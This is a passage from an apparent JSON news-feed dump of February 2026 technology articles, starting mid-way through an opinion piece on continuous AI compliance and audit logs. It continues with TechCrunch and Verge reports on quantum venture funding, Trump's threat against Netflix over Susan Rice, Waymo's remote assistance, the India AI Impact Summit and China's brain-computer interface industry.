suggests someone is trying to manipulate or misuse the AI. For instance, rapid-fire queries attempting prompt injection or adversarial inputs could be automatically flagged by the system’s telemetry as potential misuse.</p></li></ul><p>When a drift or misuse signal crosses a critical threshold, the system should support “intelligent escalation” rather than waiting for a quarterly review. In practice, this could mean triggering an automated mitigation or immediately alerting a human overseer. Leading organizations build in fail-safes like kill-switches, or the ability to suspend an AI’s actions the moment it behaves unpredictably or unsafely. </p><p>For example, a service contract might allow a company to instantly pause an AI agent if it’s outputting suspect results, even if the AI provider hasn’t acknowledged a problem. Likewise, teams should have playbooks for rapid model rollback or retraining windows: If drift or errors are detected, there’s a plan to retrain the model (or revert to a safe state) within a defined timeframe. This kind of agile response is crucial; it recognizes that AI behavior may drift or degrade in ways that cannot be fixed with a simple patch, so swift retraining or tuning is part of the compliance loop.</p><p>By continuously monitoring and reacting to drift and misuse signals, companies transform compliance from a periodic audit to an ongoing safety net. Issues are caught and addressed in hours or days, not months. The AI stays within acceptable bounds, and governance keeps pace with the AI’s own learning and adaptation, rather than trailing behind it. This not only protects users and stakeholders; it gives regulators and executives peace of mind that the AI is under constant watchful oversight, even as it evolves.</p><h2>Audit logs designed for legal defensibility</h2><p>Continuous compliance also means continuously documenting what your AI is doing and why. Robust audit logs demonstrate compliance, both for internal accountability and external legal defensibility. However, logging for AI requires more than simplistic logs. Imagine an auditor or regulator asking: “Why did the AI make this decision, and did it follow approved policy?” Your logs should be able to answer that.</p><p>A good AI audit log keeps a permanent, detailed record of every important action and decision AI makes, along with the reasons and context. Legal experts say these logs &quot;provide detailed, unchangeable records of AI system actions with exact timestamps and written reasons for decisions.&quot; They are important evidence in court. This means that every important inference, suggestion or independent action taken by AI should be recorded with metadata, such as timestamps, the model/version used, the input received, the output produced and (if possible) the reasoning or confidence behind that output. </p><p>Modern compliance platforms stress logging not only the result (&quot;X action taken&quot;) but also the rationale (&quot;X action taken because conditions Y and Z were met according to policy&quot;). These enhanced logs let an auditor see, for example, not just that an AI approved a user&#x27;s access, but that it was approved &quot;based on continuous usage and alignment with the user&#x27;s peer group,&quot; according to Attorney <a href=\"https://aaronhall.com/ai-audit-logs-as-legal-defense-evidence/\"><u>Aaron Hall</u></a>.</p><p>Audit logs should also be well-organized and difficult to change if they are to be legally sound. Techniques like immutable storage or cryptographic hashing of logs ensure that records can&#x27;t be changed. Log data should be protected by access controls and encryption so that sensitive information, such as security keys and personal data, is hidden or protected while still being open. </p><p>In regulated industries, keeping these logs can show examiners that you are not only keeping track of AI&#x27;s outputs, but you are retaining records for review. Regulators are expecting companies to show more than that an AI was checked before it was released. They want to see that it is being monitored continuously and there is a forensic trail to analyze its behavior over time. This evidentiary backbone comes from complete audit trails that include data inputs, model versions and decision outputs. They make AI less of a &quot;black box&quot; and more of a system that can be tracked and held accountable.</p><p>If there is a disagreement or an event (for example, an AI made a biased choice that hurt a customer), these logs are your legal lifeline. They help you figure out what went wrong. Was it a problem with the data, a model drift or misuse? Who was in charge of the process? Did we stick to the rules we set? </p><p>Well-kept AI audit logs show that the company did its homework and had controls in place. This not only lowers the risk of legal problems but makes people more trusting of AI systems. With AI, teams and executives can be sure that every decision made is safe because it is open and accountable.</p><h2>Inline governance as an enabler, not a roadblock</h2><p>Implementing an “audit loop” of continuous AI compliance might sound like extra work, but in reality, it enables faster and safer AI delivery. By integrating governance into each stage of the AI lifecycle, from shadow mode trial runs to real-time monitoring to immutable logging, organizations can move quickly and responsibly. Issues are caught early, so they don’t snowball into major failures that require project-halting fixes later. Developers and data scientists can iterate on models without endless back-and-forth with compliance reviewers, because many compliance checks are automated and happen in parallel. </p><p>Rather than slowing down delivery, this approach often accelerates it: Teams spend less time on reactive damage control or lengthy audits, and more time on innovation because they are confident that compliance is <a href=\"https://hoop.dev/blog/how-to-keep-ai-governance-ai-audit-trail-secure-and-compliant-with-inline-compliance-prep/\">under control in the background</a>.</p><p>There are bigger benefits to continuous AI compliance, too. It gives end-users, business leaders and regulators a reason to believe that AI systems are being handled responsibly. When every AI decision is clearly recorded, watched and checked for quality, stakeholders are much more likely to accept AI solutions. This trust benefits the whole industry and society, not just individual businesses. </p><p>An audit-loop governance model can stop AI failures and ensure AI behavior is in line with moral and legal standards. In fact, strong AI governance benefits the economy and the public because it encourages innovation and protection. It can unlock AI&#x27;s potential in important areas like finance, healthcare and infrastructure without putting safety or values at risk. As national and international standards for AI change quickly, U.S. companies that set a good example by always following the rules are at the forefront of trustworthy AI.</p><p>People say that if your AI governance isn&#x27;t keeping up with your AI, it&#x27;s not really governance; it&#x27;s &quot;archaeology.&quot; Forward-thinking companies are realizing this and adopting audit loops. By doing so, they not only avoid problems but make compliance a competitive advantage, ensuring that faster delivery and better oversight go hand in hand.</p><p><i>Dhyey Mavani is working to accelerate gen AI and computational mathematics. </i></p><p><i>Editor&#x27;s note: The opinions expressed in this article are the authors&#x27; personal opinions and do not reflect the opinions of their employers.</i> </p>",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Quantonation's double-sized second fund shows quantum still has believers",
      "url": "https://techcrunch.com/2026/02/22/quantonations-double-sized-second-fund-shows-quantum-still-has-believers/",
      "published": "2026-02-22T18:00:00+00:00",
      "summary": "Quantonation Ventures, a venture firm investing in quantum and physics-based startups, has closed its oversubscribed second fund at €220 million, or approximately $260 million. That’s more than twice the size of its inaugural fund, and comes in addition to other signals that the quantum winter isn’t coming yet.",
      "content_text": "Quantum computing will not be replacing supercomputers in 2026, let alone reaching industrial scale. And yet, investor appetite for companies pursuing the elusive quantum advantage hasn’t dwindled — it has increased. Quantonation Ventures , a venture firm investing in quantum and physics-based startups, has closed its oversubscribed second fund at €220 million , or approximately $260 million. That’s more than twice the size of its inaugural fund, and comes in addition to other signals that the quantum winter isn’t coming yet. While some warned that too much quantum hype and not enough tangible outcomes would eventually cause funding to collapse, the opposite has happened. Take the prediction that quantum will eventually crack modern encryption: that moment has no clear timeline, and yet governments have joined Big Tech in the race. In the years since Quantonation’s launch in 2018, the quantum technology sector has become less incipient, with both technological breakthroughs and early demand from academic and industrial labs. As a result, there has also been “a shift in the types of investment opportunities that are available” to its second fund, Quantonation partner Will Zeng told TechCrunch. One example is what Zeng describes as the “picks and shovels” opportunity, with companies developing technologies that support the quantum industry. He cited the example of Dutch startup Qblox, a long-boostrapped company that was selling quantum control hardware and software to Quantonation portfolio companies before the VC firm co-led its Series A . This growing ecosystem also explains why backers are doubling down on Quantonation, and why other dedicated quantum funds such as QDNL and 55 North have emerged. “VCs recognize that this is not an easy area to invest in at the early stage. The technology is very specific and complex, the markets are often new, and the teams as well,” Zeng said. Techcrunch event Boston, MA | June 9, 2026 The firm’s thesis is to invest early to capture more value; but a handful of quantum companies have already gone public, and their shares have surged in recent months. According to Bloomberg, this “quantum frenzy” is partly stocked by Nvidia, whose CEO Jensen Huang declared in June 2025 that “quantum computing is reaching an inflection point.” Despite the fact that quantum chips have yet to outperform classical computers outside of purpose-built benchmarks, consensus is growing that real-life applications are only a few years away, from life sciences to new materials. That’s in part thanks to advancements in error correction — the ability to fix the mistakes that quantum systems are prone to. Google’s Willow chip was a landmark for error correction in 2024, but no architecture has won yet, and smaller players are still in the race . Zeng noted that a surprising number of companies have entered DARPA’s Quantum Benchmarking Initiative . He also believes that beyond the public market excitement, “there are more exciting technologies that are currently private.” For Quantonation, those private opportunities span a wider canvas than quantum chips alone. Fund two has already invested in 12 startups, with a target portfolio of around 25, covering not just the software and industrial layers needed to make quantum advantage real, but also adjacent physics-based technologies such as photonics and lasers. This expanded thesis is backed by investors old and new. According to the firm, major investors from its first vintage, including Singapore’s Vertex Holdings and Bpifrance’s Fonds National d’Amorçage 2, have returned for the second fund, with new limited partners including the European Investment Fund, Grupo ACS, Novo Holdings, Planet First Partners, and Toshiba. Quantonation’s geographic scope is equally international. With dual headquarters in Paris and New York City, the firm has backed French quantum companies including Pasqal and Quandela, but also placed bets in Asia and North America — and will continue doing so. “In a lot of the areas we invest in, there’s not yet a clear regional winner, […] and a lot of the research has come from universities in many places,” Zeng said.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2023/01/GettyImages-1393513219.jpg?resize=1200,568"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Trump says Netflix will face ‘consequences’ if it doesn’t fire board member Susan Rice",
      "url": "https://techcrunch.com/2026/02/22/trump-says-netflix-will-face-consequences-if-it-doesnt-fire-board-member-susan-rice/",
      "published": "2026-02-22T17:39:55+00:00",
      "summary": "Netflix board member Susan Rice had predicted that corporations that “take a knee” to Trump will be “held accountable” when Democrats return to power.",
      "content_text": "President Donald Trump said in a social media post Saturday that Netflix will “pay the consequences” if it doesn’t fire Susan Rice, who has served on the company’s board of directors since 2018. Trump’s comments came after Rice — a former ambassador to the United Nations who held diplomatic and advisory roles in the Obama and Biden administrations — appeared on the “Stay Tuned with Preet” podcast hosted by Preet Bharara and predicted that corporations that “take a knee” to Trump will be “held accountable” when Democrats return to power. “If these corporations think that the Democrats, when they come back in power, are going to, you know, play by the old rules, and […] say, ‘Oh, never mind. We’ll forgive you for all the people you fired, all the policies and principles you’ve violated, all, you know, the laws you’ve skirted,’ I think they’ve got another thing coming,” Rice said. In response, Trump posted on his social network Truth Social , “Netflix should fire racist, Trump Deranged Susan Rice, IMMEDIATELY, or pay the consequences. She’s got no talent or skills – Purely a political hack! HER POWER IS GONE, AND WILL NEVER BE BACK. How much is she being paid, and for what???” Trump’s post also includes a screenshot of a post from far-right activist Laura Loomer criticizing Rice’s comments and claiming, “The Netflix-Warner Bros. merger would result in a streaming monopoly, which the Obamas will have a significant stake in” due to the deal between Netflix and the Obamas’ production company Higher Ground . While Trump’s post does not mention specific consequences, Netflix’s massive Warner Bros. acquisition will need to be approved by federal regulators. The streaming company’s co-CEO Ted Sarandos reportedly met with Trump before the deal was announced, with Trump subsequently saying that Netflix is a “great company […] but it’s a lot of market share, so we’ll have to see what happens.” Last fall, Trump published a similar post demanding that Microsoft fire its president of global affairs Lisa Monaco , who was also targeted by Loomer. Monaco is still at Microsoft. Techcrunch event Boston, MA | June 9, 2026",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/08/GettyImages-2227934246.jpg?w=1024"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "TechCrunch Mobility: Waymo makes its defense",
      "url": "https://techcrunch.com/2026/02/22/techcrunch-mobility-waymo-makes-its-defense/",
      "published": "2026-02-22T17:05:00+00:00",
      "summary": "Welcome back to TechCrunch Mobility — your central hub for news and insights on the future of transportation.",
      "content_text": "Welcome back to TechCrunch Mobility — your central hub for news and insights on the future of transportation. To get this in your inbox, sign up here for free — just click TechCrunch Mobility ! Earlier this month, Waymo chief safety officer Mauricio Peña testified before the Senate Commerce Committee as part of a hearing to talk about autonomous vehicles. Much of the questioning fell under the standard “let’s educate the public” category. But it was Sen. Ed Markey’s questions about overseas workers, and Peña’s response, that everyone paid attention to. Peña, when asked about human workers who assist with Waymo vehicles’ navigation or emergencies, revealed that the company has remote guidance workers based overseas in the Philippines. This sparked some quick ire from Markey, who admonished Peña on how the company could rely on people without U.S. driver’s licenses to assist its vehicles on U.S. roads, among other criticisms. Waymo formulated a response in a blog post written by Waymo’s head of global operations Ryan McNamara, which was published Tuesday. It has also shared the letter it sent to Markey’s office. The post and letter do provide fresh insight about its remote-assistance operations. For instance, Waymo stresses it does not employ people who “remotely drive” the robotaxis. Instead, the self-driving systems are the ones in charge. Remote assistance (RA) workers are there to respond to specific requests for information that the Waymo self-driving system asks for. The company also has Event Response Teams, or ERTs, people who are certified for more complex tasks and are exclusively based in the United States. This team responds to collisions, interfacing with law enforcement and the rider, collecting data for regulatory reporting, and coordinating towing, Waymo says. Techcrunch event Boston, MA | June 9, 2026 We also now know that Waymo has about “70 Remote Assistance agents on duty worldwide at any given time.” These folks are based in Arizona, Michigan, and in two cities in the Philippines, a detail that, again, has raised the ire of some lawmakers. To give you a sense of what that means, consider that Waymo has a fleet of 3,000 vehicles and every week its vehicles drive over 4 million miles and provide over 400,000 rides. So, very few workers are monitoring lots of robotaxis. I have argued for years that AV companies need to do a better job of explaining what happens behind the scenes, particularly when it comes to remote guidance. Most companies, many of which no longer exist, avoided the topic like a plague, perhaps in an effort to make its tech seem more magical and innovative. Turns out, mystery breeds mistrust. While the debate over remote guidance operators plays out, Waymo continues to press into new markets. With one exception. New York governor Kathy Hochul withdrew a proposal that would have amended vehicle and traffic laws to effectively legalize robotaxis in the state outside of New York City. Hochul spokesperson Sean Butler told me: “Based on conversations with stakeholders, including in the legislature, it was clear that the support was not there to advance this proposal.” One more thing before we jump into the rest of the news. Mobility readers sure don’t believe the Rivian R2 will be priced at $50,000 or below. Last week, I polled you all and asked: “What will the starting price of the Rivian R2 launch edition be?” I gave three options, under $50,000, above $60,000, and above $70,000. More than 54% picked “above $60,000,” with the remaining two options split on the matter. To participate in our polls, sign up for the Mobility newsletter here . A little bird Image Credits: Bryce Durbin Senior reporter Sean O’Kane got the scoop from some little birds about layoffs at Lucid . Here’s what we know. Lucid is laying off 12% of its workforce, according to an internal memo that TechCrunch has viewed. We don’t have an exact figure on workers affected, but it is likely hundreds. Lucid has not filed its 2025 annual earnings yet, which would disclose how many employees it had at the end of the year. The company reported having 6,800 full-time employees globally at the end of 2024 . Since our report came out, O’Kane has learned a bit more. Affected employees found out early Friday morning, with a few learning that something was amiss when they lost access to Microsoft Teams. They are technically being placed on a 60-day “administrative leave” and won’t be officially laid off until late April. Got a tip for us? Email Kirsten Korosec at kirsten.korosec@techcrunch.com or my Signal at kkorosec.07, or email Sean O’Kane at sean.okane@techcrunch.com . Deals! Image Credits: Bryce Durbin Amari AI , a startup that uses AI tools to help custom brokers modernize and navigate President Trump’s trade policies, raised $4.5 million of funding co-led by preeminent early-stage firms First Round Capital and Pear VC. The startup says it has already collected more than 30 customers and helped those firms move more than $15 billion of goods. Kavak , the Mexico-based online used car dealer, raised $300 million in an equity round led by Andreessen Horowitz, which put in $200 million. Other investors included WCM Investment Management, which co-led the round, and Foxhaven Asset Management. LanzaJet , a next-gen fuels technology company and fuels producer, raised $47 million in the first close of a targeted $135 million equity round. The company said its pre-money valuation is $650 million. The was co-led by IAG and Shell, with participation from Groupe ADP, LanzaTech, and Mitsui. Metafuels , a sustainable aviation fuel startup based in Switzerland, raised $24 million in a Series A round led by UVC Partners. Other investors included Energy Impact Partners, Contrarian Ventures, RockCreek, Verve Ventures, and Fortescue. Notable reads and other tidbits Image Credits: Bryce Durbin Ford is working hard to make shareholders forget about the $19.5 billion hit it took late last year. Instead, it wants them to see a tech-forward and nimble company building a future profitable product that will usher in a new era. The company, which has promised to deliver an EV truck that starts at $30,000 and can compete with Chinese automakers without undermining profit margins, shared how it plans to hit that goal . Will a combination of 3D-printed Lego-like parts, Formula 1 thinking, and a bounty program be enough? AI data center fever has spread. Just take a look at Redwood Materials for proof. The battery recycling and materials startup launched an energy storage business last year with a focus on AI data centers. The business, Redwood Energy, is now the fastest-growing unit within the company. Read my full story to understand what that means . Rivian is launching a companion app that will let owners perform basic tasks such as locking and unlocking doors, venting windows, and triggering the vehicle alarm using their Apple Watch . The company released a broader software update with a number of other new vehicle features as well. Tesla lost its bid to overturn a jury’s $243 million verdict in a fatal Autopilot crash trial. Reminder: Tesla could have settled this case for $60 million. The company did score a win, however, with the California Department of Motor Vehicles . The state agency said it will not suspend Tesla’s sales and manufacturing licenses for 30 days because the EV maker has stopped using the term “Autopilot” in the marketing of its vehicles in the state. One more thing … Image Credits: Kirsten Korosec I periodically test vehicles to keep pace with the latest in-car tech, EVs, and hybrids — or software updates in them. Coincidentally, I had a Lucid Air Touring sedan this week. It’s been at least a year since I was behind the wheel of an Air. And I’ve been anxious to try the company’s hands-free driver-assistance system that launched last July. My past experiences with the company’s advanced driver-assistance system, called Dream Drive, has left me unimpressed. My vehicle would often ping-pong in the lane (meaning it had trouble centering itself) or would stay too close to the edge, which put me uncomfortably close to the big rigs I passed on the highway. I am happy to report that Lucid appears to have fixed these issues. Engaging the hands-free system was straightforward and it didn’t allow me to abuse it for long. As you see in the picture above, if I put a phone in front of my face, a warning was almost immediately triggered.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/11/SF_WAYMO-FREEWAY_FRONT.jpg?resize=1200,801"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "All the important news from the ongoing India AI Impact Summit",
      "url": "https://techcrunch.com/2026/02/22/all-the-important-news-from-the-ongoing-india-ai-summit/",
      "published": "2026-02-22T17:00:00+00:00",
      "summary": "India is hosting a four-day AI Summit this week that will be attended by executives from major AI labs and Big Tech, including OpenAI, Anthropic, Nvidia, Microsoft, Google, and Cloudflare, as well as heads of state.",
      "content_text": "With an eye toward luring more AI investment to the country, India is hosting a four-day AI Impact Summit this week that will be attended by executives from major AI labs and Big Tech, including OpenAI, Anthropic, Nvidia, Microsoft, Google, and Cloudflare, as well as heads of state. The event, which expects 250,000 visitors, will see Alphabet CEO Sundar Pichai, OpenAI CEO Sam Altman, Anthropic CEO Dario Amodei, Reliance Chairman Mukesh Ambani, and Google DeepMind CEO Demis Hassabis in attendance. India’s prime minister, Narendra Modi, is scheduled to deliver a speech with French President Emmanuel Macron on Thursday. Here are all the key updates from the event: India earmarks $1.1 billion for its state-backed venture capital fund . The fund will invest in artificial intelligence and advanced manufacturing startups across the country. OpenAI CEO Sam Altman said India accounts for more than 100 million weekly active ChatGPT users , second only to the U.S. He also said Indians account for the most students using ChatGPT. Blackstone has picked up a majority stake in Indian AI startup Neysa as part of a $600 million equity fundraise . Teachers’ Venture Growth, TVS Capital, 360 ONE Asset, and Nexus Venture Partners also invested. The company now plans to raise another $600 million in debt, and deploy more than 20,000 GPUs. Bengaluru-based C2i, which is building a power solution for data centers, raised $15 million in a Series A round from Peak XV , with participation from Yali Deeptech and TDK Ventures. HCL CEO Vineet Nayyar said Indian IT companies will focus on turning profits and not being job creators . These comments come as Indian IT stocks dip as fears of AI disrupting the IT services sector burgeon. Vinod Khosla, founder of Khosla Ventures, said that industries like IT services and BPOs (Business Process Outsourcing) can “almost completely disappear” within five years because of AI. He told Hindustan Times that 250 million young people in India should be selling AI-based products and services to the rest of the world. AMD is teaming up with Tata Consultancy Services (TCS) to develop rack-scale AI infrastructure based on AMD’s “Helios” platform. Anthropic said that it is opening its first office in India in the city of Bengaluru. The company said that the country is the second biggest user of Claude after the U.S. Anthropic is partnering with IT giant Infosys to deploy Claude models and tools like Claude code to Indian enterprises. To begin, both will deploy AI tools in the telecommunications sector with a dedicated Anthropic Center of Excellence. Indian AI company Sarvam teases its upcoming smart glasses under the name Sarvam Kaze. The company has released several models in the past few weeks, including a dubbing model, a speech-to-text model, a text-to-speech model, and a vision model for Optical Character Recognition (OCR). Indian conglomerate Adani said that it is allocating $100 billion to build AI data centers that would use renewable energy in India by 2035. The company said that this investment will lead to an additional $150 billion investment in areas like server manufacturing, advanced electrical infrastructure, sovereign cloud platforms, and supporting industries. Voice AI company Cartesia is teaming up with India-based orchestrator Blue Machines to deploy voice solutions for enterprises with local data residency. Cohere Labs launches a family of multilingual models with open weights that support over 70 languages. These models can run on local devices. The company said that it has also released models tuned to specific regions. OpenAI said it will open two new offices in India in Bengaluru and Mumbai. OpenAI also partnered with the Tata group to deploy 100 megawatts of compute in India with an aim to scale it up to 1 gigawatt . India’s tech minister Ashwini Vaishnaw said that the country wants to attract over $200 billion in investment for AI infrastructure in the next two years . India’s vibe-coding startup Emergent said that it has reached $100 in ARR and launched a mobile app. Indian AI startup Sarvam released two new open-sourced models: Sarvam 30B and Sarvam 105B . Sarvam also announced a partnership with Qualcomm, HMD, and Bosch to deploy its AI models to devices, including smartphones, feature phones, cars, laptops, and smartglasses. Voice AI startup Gnani released a zero-shot voice cloning text-to-speech model called Vachana, which supports 12 languages. BharatGen, a government-backed AI consortium, released a 17 billion parameter model called Param 2 that works across 22 languages. Steaming service JioHotstar said it will use ChatGPT to aid content discovery with conversational search. Sarvam launches its ChatGPT competitor called Indus that supports multiple Indian languages. OpenAI said that 18-24-year-old users in India drive nearly 50% of the usage in India on ChatGPT . Indian tech company Tech Mahindra released an 8 billion parameter Hindi-oriented model for educational use cases. UAE’s G42 teamed up with U.S.-based chip maker Cerebras to deploy 8 exaflops of compute in India through a supercomputer . Abu Dhabi’s Mohamed bin Zayed University of Artificial Intelligence (MBZUAI) and India’s Centre for Development of Advanced Computing (C-DAC) are also part of the project. On the sidelines of the India AI summit, Sam Altman said that concerns around how much water AI uses are “totally fake,” but acknowledged the issue of water usage when “we used to do evaporative cooling in data centers.” Strangely, he also said that humans use a lot of energy as they grow up and process things around them. He thinks that the arguments around ChatGPT’s power consumption are “unfair.” “But it also takes a lot of energy to train a human,” Altman said. “It takes like 20 years of life and all of the food you eat during that time before you get smart.” India said that over 88 countries and organizations signed the New Delhi AI declaration for working towards using AI for social and economic good. These countries included the U.S., China, and Russia. India joined the Pax Silica group led by the U.S. to create a smooth supply chain network of materials used in creating AI infrastructure. Other members include the U.K, United Arab Emirates, Singapore, Qatar, Japan, Israel, South Korea, and Australia.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2024/06/india-ai.jpg?w=1200"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "China's brain-computer interface industry is racing ahead",
      "url": "https://techcrunch.com/2026/02/22/chinas-brain-computer-interface-industry-is-racing-ahead/",
      "published": "2026-02-22T16:00:00+00:00",
      "summary": "China’s brain-computer interface industry is rapidly scaling from research to commercialization, driven by strong policy support, expanding clinical trials, and growing investor interest.",
      "content_text": "While Elon Musk’s Neuralink likes to say it’s “ pioneering ” brain-computer interfaces (BCIs), China’s BCI industry is already quietly moving from research to scale. A new wave of startups is racing to commercialize both implantable and noninvasive BCIs, backed by stronger policy support, expanding clinical trials, and growing investor interest. So says Phoenix Peng, who has founded not one but two BCI startups. He’s a co-founder of NeuroXess, maker of BCI implants, as well as founder and CEO of noninvasive ultrasound BCI startup Gestala. His belief in the potential of this market is founded on concrete action: Provinces such as Sichuan, Hubei, and Zhejiang have already set medical service pricing for BCI, speeding its inclusion in the national medical insurance system. Over time, he foresees the technology extending beyond medicine “treating disease” to “human augmentation,” he said. “I have always maintained that neuroscience and AI are two sides of the same coin,” Peng said. “They are destined for deep integration, realizing direct high-bandwidth connections between the human brain and AI. BCI will serve as the ultimate bridge between carbon-based and silicon-based intelligence. While this may sound distant, it represents an unimaginably vast market in the future.” Four factors driving BCI in China But over the next three to five years, BCI use is likely to stay concentrated in healthcare, with the market reaching multibillion-dollar scale as insurance coverage expands, Peng told TechCrunch. In August 2025, China’s industry ministry and six other agencies released a national roadmap to further speed development of BCIs. The plan targets major technical milestones by 2027, common industry standards, and a full supply chain by 2030, with the goal of building globally competitive BCI companies and supporting smaller specialized firms. Techcrunch event Boston, MA | June 9, 2026 Asked what’s driving China’s rapid progress in BCI, Peng told TechCrunch it comes down to four factors. The first one is strong policy support, with cross-department collaboration that aligns technical standards and medical reimbursement. In December, at the 2025 Shenzhen BCI & Human-Computer Interaction Expo, China announced an 11.6 billion yuan ($165 million) brain science fund to support BCI companies from research through commercialization. The second factor is vast clinical resources, including large patient pools and lower research costs that accelerate trials. China’s national health insurance means quicker commercialization once the state approves a device. This compares to the U.S. where even after the FDA approves a device, private insurers, as the main payers, must each individually do so. Researchers have completed the country’s first fully implanted, wireless BCI trial — only the second globally — allowing a paralyzed patient to control devices without external hardware, per CGTN . Neuralink is the startup that completed the first such trial . “In traditional electrical BCIs, Chinese firms have achieved clinical progress in motor and language decoding, spinal cord reconstruction, and stroke rehabilitation, with over 50 flexible implantable BCI clinical trials completed by mid-2025,” Peng said, adding that next-generation efforts are now moving toward whole-brain neural decoding and encoding, including ultrasound-based approaches such as Gestala ’s. The third factor is China’s mature industrial manufacturing, Peng points out, spanning semiconductors, AI, and medical hardware, which supports fast R&D and prototyping. Finally, there is strategic investment in the market, with both state-led funds and private capital surging under national initiatives. Some recent key deals include Shanghai-based BCI startup StairMed Technology raising $48 million (350 million yuan) in Series B funding in February 2025. BrainCo, a neurotech company developing its noninvasive BCIs and bionic limbs, has also quietly filed for a Hong Kong IPO, according to reports, after raising $287 million (2 billion yuan) earlier this year. Peng’s company, Gestala, which launched in January, is in talks with investors to close an angel round soon, he tells us. All told, China’s BCI startups are ramping up to challenge U.S. leaders like Neuralink, Synchron, and Paradromics. Among the most active players in China are NeuroXess, Neuracle, NeuralMatrix, BrainCo, Bo Rui Kang Tech, Aoyi Tech, Brainland Tech, and Zhiran Medical. They span approaches from implantable flexible interfaces to noninvasive brain-computer technologies. This means that China’s BCI market was expected to grow to more than $530 million (3.8 billion yuan) in 2025, up from 3.2 billion yuan in 2024, according to media reports , with projections putting the market at over 120 billion yuan by 2040. BCI types BCIs are taking two paths. The first is invasive electrophysiological BCIs like NeuroXess and Neuralink that implant electrodes in people’s brains for precise neuron-level signals. But this type comes with surgery risks. The second type is noninvasive systems like NeuroSky and BrainCo that trade some precision for safety and ease of use. (These devices — typically headsets or headbands using electroencephalography (EEG) — read electrical activity through the skull.) The field is now broadening further, with emerging approaches — including ultrasound, magnetoencephalography imaging, transcranial magnetic stimulation, optical methods, and hybrid BCIs — giving researchers new tools to read and influence brain activity. Startup founders also hope that noninvasive technology could help overcome adoption barriers. Not everyone is willing to undergo brain surgery to have a device implanted in their heads. Ultrasound BCIs from companies like OpenAI-backed Merge Labs and Gestala are targeting high-prevalence conditions such as chronic pain, stroke, and depression. As noninvasive solutions, these technologies are more readily accepted by patients and offer significantly greater commercial scalability. Gestala, for instance, expects to roll out its first-generation product by Q3, said Peng. Early clinical trials have shown promising results, he added, saying that a single session reduced pain scores by 50%, with effects lasting one to two weeks. HSG, formerly Sequoia China, has meanwhile invested in Zhiran Medical, a startup founded in 2022 focused on improving long-term implant performance. The company uses flexible, high-throughput electrodes to reduce inflammation and signal loss associated with rigid implants. “Some technologies may look cutting-edge but far from practical application,” Yang Yunxia, a partner at HSG, wrote in a blog post . While others appear commercially viable, they face “high costs” or significant technical barriers, Yunxia contended. Ultimately, investment decisions come down to whether the investor believes a product can be developed into a sustainable business, the partner noted. The years ahead Over the next five years, industry insiders expect China’s BCI regulations to align more closely with international standards, with a particular focus on regulatory approval and data sovereignty. Global frameworks developed by organizations such as the IEC and ISO , along with guidance from the U.S. Food and Drug Administration (FDA ), are expected to serve as key reference points. Chinese regulators are also expected to tighten oversight of invasive devices, as well as the data that all BCI devices generate, while easing approval for noninvasive technologies. As for the ethics that confront brain-implanted or manipulating devices, China plans to strengthen informed-consent requirements, broaden ethics review beyond medicine, and move toward unified technical standards for clinical evaluation.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2022/12/GettyImages-1202271610.jpg?resize=1200,900"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "Trump says Netflix will ‘pay the consequences’ if it doesn’t fire Susan Rice",
      "url": "https://www.theverge.com/policy/882881/trump-netflix-consequences-fire-susan-rice",
      "published": "2026-02-22T15:37:41+00:00",
      "summary": "Donald Trump threatened that there would be \"consequences\" for Netflix if it didn't fire board member Susan Rice. Rice served in both the Obama and Biden administrations, and recently appeared on Preet Bharara's podcast, where she said corporations that \"take a knee to Trump\" are going to be \"caught with more than their pants down. [&#8230;]",
      "content_text": "Donald Trump threatened that there would be “consequences” for Netflix if it didn’t fire board member Susan Rice. Rice served in both the Obama and Biden administrations, and recently appeared on Preet Bharara’s podcast , where she said corporations that “take a knee to Trump” are going to be “caught with more than their pants down. They are going to be held accountable.” Right-wing influencer and conspiracy theorist Laura Loomer was quick to jump on the appearance and accused Rice of “threatening half the country with weaponized government and political retribution.” She also pointed out that Netflix , whose board Rice is on, is trying to merge with Warner Bros. This, of course, plays to one of Donald Trump’s favorite narratives, that he is somehow an aggrieved victim of political persecution. That it’s Democrats, not he, who have weaponized the government and the Department of Justice against perceived enemies. Trump pounced on Loomer’s post, adding that “Netflix should fire racist, Trump Deranged Susan Rice, IMMEDIATELY, or pay the consequences.” While his post didn’t mention any specific consequences, it’s not a stretch to assume he’s threatening to step in and block Netflix’s purchase of Warner Bros . if he doesn’t get his way. It’s already been widely assumed that Trump would prefer Warner be purchased by Paramount , which has shown a willingness to go after critics of the Trump administration and is run by the Ellison family.",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/gettyimages-1702800938.jpg?quality=90&strip=all&crop=0%2C10.732984293194%2C100%2C78.534031413613&w=1200"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "6 days left to lock in the lowest Disrupt 2026 rates",
      "url": "https://techcrunch.com/2026/02/22/6-days-left-to-lock-in-the-lowest-techcrunch-disrupt-2026-rates/",
      "published": "2026-02-22T15:00:00+00:00",
      "summary": "Super Early Bird pricing for TechCrunch Disrupt 2026 ends February 27 at 11:59 p.m. PT. That means you have just 6 days left to secure up to $680 of ticket savings.",
